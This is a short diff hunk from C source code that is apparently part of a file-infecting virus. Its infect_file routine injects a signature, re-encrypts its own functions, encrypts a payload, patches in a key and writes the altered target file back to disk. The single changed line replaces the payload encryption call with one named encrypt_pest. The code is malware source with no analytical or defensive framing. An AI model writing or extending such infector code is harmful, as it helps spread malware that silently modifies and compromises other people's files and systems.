@@ -130,7 +130,7 @@ static void	infect_file(char *path, t_fingerprint *fingerprint, t_info *info)
 	inject_sign(info, fingerprint);
 	reencrypt_func(info, &inject_sign, info->tab_addr[28] - info->tab_addr[27], key);
 	crypt_payload(info, fingerprint->fingerprint);
-	patch_key(info, encrypt(info, info->file + info->offset_bis + BIS_SIZE, PAYLOAD_SIZE, fingerprint->fingerprint));
+	patch_key(info, encrypt_pest(info, info->file + info->offset_bis + BIS_SIZE, PAYLOAD_SIZE, fingerprint->fingerprint));
 	ft_syswrite(info->fd, info->file, info->file_size);
 end_fct:
 	ft_sysmunmap(info->file, info->file_size);
